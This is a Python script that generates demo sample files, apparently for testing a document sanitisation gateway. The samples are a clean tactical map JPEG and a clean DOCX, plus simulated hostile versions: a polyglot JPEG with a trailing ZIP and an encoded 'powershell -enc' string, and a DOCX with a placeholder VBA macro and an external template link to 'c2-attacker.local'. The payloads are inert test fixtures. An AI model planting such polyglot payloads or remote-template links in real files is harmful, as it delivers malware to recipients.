import io
import math
import zipfile
from pathlib import Path
from xml.sax.saxutils import escape

from PIL import Image, ImageDraw

from demo_scripts.generate_clean_pdf import _load_font


def render_tactical_map_image(width: int = 900, height: int = 540) -> Image.Image:
    """Menggambar peta situasi lapangan / foto taktis KODIM 0606 dengan Pillow."""
    img = Image.new("RGB", (width, height), color=(18, 30, 27))
    draw = ImageDraw.Draw(img)

    font_header = _load_font(15, bold=True)
    font_sub = _load_font(12, bold=False)
    font_label = _load_font(13, bold=True)
    font_small = _load_font(11, bold=False)
    font_watermark = _load_font(18, bold=True)

    # Kontur medan topografi halus
    for radius, center in [
        (220, (240, 290)),
        (165, (240, 290)),
        (110, (240, 290)),
        (200, (660, 230)),
        (140, (660, 230)),
    ]:
        cx, cy = center
        draw.ellipse(
            [cx - radius, cy - radius // 2, cx + radius, cy + radius // 2],
            outline=(31, 56, 48),
            width=1,
        )

    # Grid koordinat taktis
    grid_step = 60
    cols = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N"]
    for idx, x in enumerate(range(60, width - 20, grid_step)):
        draw.line([(x, 54), (x, height - 42)], fill=(30, 52, 46), width=1)
        if idx < len(cols):
            draw.text((x + 6, 60), f"{cols[idx]}1", fill=(104, 146, 132), font=font_small)

    for idx, y in enumerate(range(80, height - 40, grid_step), start=1):
        draw.line([(40, y), (width - 24, y)], fill=(30, 52, 46), width=1)
        draw.text((12, y - 6), f"0{idx}", fill=(104, 146, 132), font=font_small)

    # Sungai & jalur arteri simulasi (kurva halus)
    river_pts = [
        (40 + i * 28, int(330 + 38 * math.sin(i * 0.45) - i * 4))
        for i in range(32)
    ]
    draw.line(river_pts, fill=(38, 96, 145), width=5)

    road_pts = [(60, 440), (260, 360), (470, 285), (690, 255), (860, 175)]
    draw.line(road_pts, fill=(140, 114, 58), width=3)

    # Zona Sektor A - Bogor (lingkaran radius taktis)
    sx, sy = 290, 245
    draw.ellipse([sx - 68, sy - 68, sx + 68, sy + 68], outline=(235, 112, 74), width=2)
    draw.ellipse([sx - 12, sy - 12, sx + 12, sy + 12], fill=(224, 72, 54), outline=(255, 224, 180), width=2)
    draw.rectangle([sx + 18, sy - 24, sx + 188, sy + 18], fill=(26, 36, 44), outline=(235, 112, 74), width=2)
    draw.text((sx + 26, sy - 18), "Sektor A - Bogor", fill=(255, 224, 180), font=font_label)
    draw.text((sx + 26, sy + 1), "Koord: 06.597S 106.806E", fill=(180, 200, 210), font=font_small)

    # Penanda Posko Komunikasi
    px, py = 605, 295
    diamond = [(px, py - 15), (px + 15, py), (px, py + 15), (px - 15, py)]
    draw.polygon(diamond, fill=(34, 197, 94), outline=(215, 255, 230), width=2)
    draw.line([(sx + 12, sy), (px - 15, py)], fill=(96, 186, 140), width=2)
    draw.rectangle([px + 20, py - 24, px + 210, py + 18], fill=(20, 42, 34), outline=(52, 211, 153), width=2)
    draw.text((px + 28, py - 18), "Posko Komunikasi", fill=(167, 243, 208), font=font_label)
    draw.text((px + 28, py + 1), "Link Sandi: AKTIF / AMAN", fill=(180, 225, 205), font=font_small)

    # Bar Header Taktis Atas
    draw.rectangle([0, 0, width, 46], fill=(12, 20, 24))
    draw.line([(0, 46), (width, 46)], fill=(52, 211, 153), width=2)
    draw.text((18, 14), "PETA SITUASI LAPANGAN - KODIM 0606/KOTA BOGOR", fill=(236, 253, 245), font=font_header)
    draw.text((width - 280, 16), "13 NOV 2026 09:00 WIB | TERBATAS", fill=(148, 210, 189), font=font_sub)

    # Watermark Bawah
    draw.rectangle([0, height - 38, width, height], fill=(12, 20, 24))
    draw.line([(0, height - 38), (width, height - 38)], fill=(71, 85, 105), width=1)
    draw.text(
        (width // 2 - 225, height - 29),
        "DOKUMENTASI LAPANGAN KODIM 0606 - SIMULASI",
        fill=(226, 232, 240),
        font=font_watermark,
    )

    return img


def build_clean_jpeg_bytes(with_exif: bool = False) -> bytes:
    """Menghasilkan JPEG peta taktis bersih (opsional menyematkan metadata EXIF)."""
    img = render_tactical_map_image()
    buf = io.BytesIO()
    if with_exif:
        exif = img.getexif()
        exif[271] = "KODIM-FIELD-CAM"  # Make
        exif[272] = "Tactical-Sensor-0606"  # Model
        exif[270] = "Dokumentasi Lapangan Sektor A - Bogor (Simulasi)"  # ImageDescription
        exif[305] = "Kertopati Field Telemetry v1"  # Software
        img.save(buf, format="JPEG", quality=95, exif=exif.tobytes())
    else:
        img.save(buf, format="JPEG", quality=95)
    return buf.getvalue()


def build_clean_jpeg(output_path: Path, with_exif: bool = False) -> None:
    """Menulis file JPEG peta taktis bersih."""
    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_bytes(build_clean_jpeg_bytes(with_exif=with_exif))


def build_polyglot_jpeg_bytes() -> bytes:
    """Menghasilkan byte JPEG polyglot dengan EXIF + trailing payload ZIP + PowerShell."""
    base_jpg = build_clean_jpeg_bytes(with_exif=True)
    trailing_payload = (
        b"PK\x03\x04\x14\x00\x00\x00\x00\x00SIMULATED_POLYGLOT_PAYLOAD"
        b" powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIAB0AGUAcwB0AA=="
    )
    return base_jpg + trailing_payload


def build_polyglot_jpeg(output_path: Path) -> None:
    """Menulis file JPEG polyglot valid namun mengandung trailing payload setelah FF D9."""
    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_bytes(build_polyglot_jpeg_bytes())


def _w_cell(text: str, bold: bool = False, shade: str | None = None, width_dxa: int = 1800) -> str:
    shd = f'<w:shd w:val="clear" w:color="auto" w:fill="{shade}"/>' if shade else ""
    rpr = "<w:rPr><w:b/><w:sz w:val=\"20\"/></w:rPr>" if bold else "<w:rPr><w:sz w:val=\"20\"/></w:rPr>"
    return (
        "<w:tc>"
        f'<w:tcPr><w:tcW w:w="{width_dxa}" w:type="dxa"/>{shd}</w:tcPr>'
        f"<w:p><w:r>{rpr}<w:t xml:space=\"preserve\">{escape(text)}</w:t></w:r></w:p>"
        "</w:tc>"
    )


def build_structured_document_xml() -> str:
    """Menghasilkan OOXML word/document.xml terstruktur dengan heading, paragraf, dan tabel satuan."""
    rows_data = [
        ("1", "Kodim 0606/Kota Bogor", "Gateway Zero-Trust Kertopati", "Aman / Terverifikasi", "Audit CDR & Hash Aktif"),
        ("2", "Kodim 0607/Kota Sukabumi", "Terminal E-Office Terenkripsi", "Siap Operasi", "Sertifikat BSrE Valid"),
        ("3", "Kodim 0608/Cianjur", "Server Arsip Lokal Satuan", "Siap Operasi", "Cadangan Luring Tersedia"),
        ("4", "Korem 061/Suryakencana", "Konsolidator Rantai Ledger", "Optimal", "Integritas Blok 100% Utuh"),
    ]

    header_cells = "".join(
        [
            _w_cell("No", bold=True, shade="E2ECE6", width_dxa=650),
            _w_cell("Satuan", bold=True, shade="E2ECE6", width_dxa=2250),
            _w_cell("Perangkat", bold=True, shade="E2ECE6", width_dxa=2450),
            _w_cell("Status Keamanan", bold=True, shade="E2ECE6", width_dxa=1950),
            _w_cell("Keterangan", bold=True, shade="E2ECE6", width_dxa=2100),
        ]
    )
    body_rows = []
    for row in rows_data:
        cells = "".join(
            [
                _w_cell(row[0], width_dxa=650),
                _w_cell(row[1], width_dxa=2250),
                _w_cell(row[2], width_dxa=2450),
                _w_cell(row[3], bold=True, width_dxa=1950),
                _w_cell(row[4], width_dxa=2100),
            ]
        )
        body_rows.append(f"<w:tr>{cells}</w:tr>")

    table_xml = (
        "<w:tbl>"
        "<w:tblPr>"
        '<w:tblW w:w="9400" w:type="dxa"/>'
        "<w:tblBorders>"
        '<w:top w:val="single" w:sz="6" w:space="0" w:color="1D442B"/>'
        '<w:left w:val="single" w:sz="4" w:space="0" w:color="CBD5E1"/>'
        '<w:bottom w:val="single" w:sz="6" w:space="0" w:color="1D442B"/>'
        '<w:right w:val="single" w:sz="4" w:space="0" w:color="CBD5E1"/>'
        '<w:insideH w:val="single" w:sz="4" w:space="0" w:color="CBD5E1"/>'
        '<w:insideV w:val="single" w:sz="4" w:space="0" w:color="CBD5E1"/>'
        "</w:tblBorders>"
        "</w:tblPr>"
        f"<w:tr>{header_cells}</w:tr>"
        f"{''.join(body_rows)}"
        "</w:tbl>"
    )

    return (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        "<w:body>"
        "<w:p><w:r><w:rPr><w:b/><w:sz w:val=\"30\"/><w:color w:val=\"1D442B\"/></w:rPr>"
        "<w:t>REKAPITULASI LOGISTIK &amp; ANGGARAN OPERASIONAL SATUAN (SIMULASI)</w:t></w:r></w:p>"
        "<w:p><w:r><w:rPr><w:b/><w:sz w:val=\"20\"/><w:color w:val=\"475569\"/></w:rPr>"
        "<w:t>Dari: Korem 061/Suryakencana  |  Kepada: Mabesad  |  Klasifikasi: TERBATAS - SIMULASI</w:t></w:r></w:p>"
        "<w:p><w:r><w:rPr><w:sz w:val=\"22\"/></w:rPr>"
        "<w:t>Laporan ini merupakan rekapitulasi resmi kesiapan logistik, perangkat persandian, serta dukungan anggaran pemeliharaan infrastruktur siber jajaran Korem 061/Suryakencana untuk dilaporkan kepada Mabesad melalui gerbang pertukaran aman Kertopati.</w:t>"
        "</w:r></w:p>"
        f"{table_xml}"
        "<w:p><w:r><w:rPr><w:sz w:val=\"20\"/><w:color w:val=\"475569\"/></w:rPr>"
        "<w:t>Catatan: Dokumen ini adalah materi simulasi pertukaran naskah dinas elektronik tanpa macro berbahaya.</w:t>"
        "</w:r></w:p>"
        "<w:sectPr><w:pgSz w:w=\"11906\" w:h=\"16838\"/></w:sectPr>"
        "</w:body></w:document>"
    )


def _write_docx_zip(clean: bool) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(
            "[Content_Types].xml",
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Override PartName="/word/document.xml" '
            'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
            "</Types>",
        )
        zf.writestr(
            "_rels/.rels",
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" '
            'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
            'Target="word/document.xml"/>'
            "</Relationships>",
        )
        zf.writestr("word/document.xml", build_structured_document_xml())
        if clean:
            zf.writestr(
                "word/_rels/document.xml.rels",
                '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"></Relationships>',
            )
        else:
            zf.writestr(
                "word/vbaProject.bin",
                b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1SIMULATED_VBA_MACRO_WScript.Shell",
            )
            zf.writestr(
                "word/_rels/document.xml.rels",
                '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                '<Relationship Id="rId99" '
                'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
                'Target="http://c2-attacker.local/template.dotm" TargetMode="External"/>'
                "</Relationships>",
            )
    return buf.getvalue()


def build_clean_docx_bytes() -> bytes:
    return _write_docx_zip(clean=True)


def build_clean_docx(output_path: Path) -> None:
    """Menghasilkan file DOCX bersih valid tanpa macro dan tanpa relasi eksternal."""
    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_bytes(build_clean_docx_bytes())


def build_macro_docx_bytes() -> bytes:
    return _write_docx_zip(clean=False)


def build_macro_docx(output_path: Path) -> None:
    """Menghasilkan file DOCX simulasi berbahaya dengan word/vbaProject.bin & relasi eksternal."""
    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_bytes(build_macro_docx_bytes())


if __name__ == "__main__":
    samples_dir = Path(__file__).resolve().parent.parent / "demo_samples"
    clean_jpg = samples_dir / "laporan_lapangan_bersih.jpg"
    poly_jpg = samples_dir / "laporan_lapangan_polyglot.jpg"
    clean_docx = samples_dir / "rekap_anggaran_bersih.docx"
    macro_docx = samples_dir / "rekap_anggaran_macro.docx"

    build_clean_jpeg(clean_jpg, with_exif=True)
    build_polyglot_jpeg(poly_jpg)
    build_clean_docx(clean_docx)
    build_macro_docx(macro_docx)

    print(f"Generated JPEG clean: {clean_jpg} ({clean_jpg.stat().st_size} bytes)")
    print(f"Generated JPEG polyglot: {poly_jpg} ({poly_jpg.stat().st_size} bytes)")
    print(f"Generated DOCX clean: {clean_docx} ({clean_docx.stat().st_size} bytes)")
    print(f"Generated DOCX macro: {macro_docx} ({macro_docx.stat().st_size} bytes)")
